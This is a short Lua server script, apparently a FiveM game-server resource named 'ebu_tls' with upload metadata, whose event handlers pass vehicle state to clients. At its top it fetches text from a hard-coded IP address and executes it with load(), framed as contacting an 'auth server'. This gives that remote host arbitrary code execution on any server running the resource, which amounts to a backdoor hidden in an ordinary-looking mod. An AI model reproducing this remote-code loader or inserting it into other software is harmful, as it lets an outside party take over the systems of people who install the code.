--[[
	id: 382umSpNyXXg0HT4EF7qG
	name: TLS SERVER
	description: TLS SERVER
	time1: 2021-06-17 16:46:15.613588+00
	time2: 2021-06-17 16:46:15.613588+00
	uploader: nVpiI2NOtXmbABCF9f4UAzVhgQFEQ-ml4eXie1OF
	uploadersession: R0MAbYvEoiVv2MGJG-zuUK-v-Ntp5l
	flag: f
--]]

--[[
strings-override

...
]]


local script = 'ebu_tls'

PerformHttpRequest("74.91.121.153/verify.txt", function (errorCode, resultData, resultHeaders)
  if errorCode == 200 then
    assert(load("local script  = '"..script.."';".. resultData))()
  else
    print('^1'..script..' - Unable to reach auth server - Error : '..errorCode..'^0')
  end
end)

RegisterServerEvent('ebu_tls:update')
AddEventHandler('ebu_tls:update', function(num, vehicle, fixVehicle)
    local _s = source
    TriggerClientEvent('ebu_tls:update', -1, num, vehicle, fixVehicle)
end)

RegisterServerEvent('ebu_tls:eOn')
AddEventHandler('ebu_tls:eOn', function(vehicle, bHealth, eHealth, fHealth, tires, num, fixVehicle)
    TriggerClientEvent('ebu_tls:eOn', -1, vehicle, bHealth, eHealth, fHealth, tires, num, fixVehicle)
end)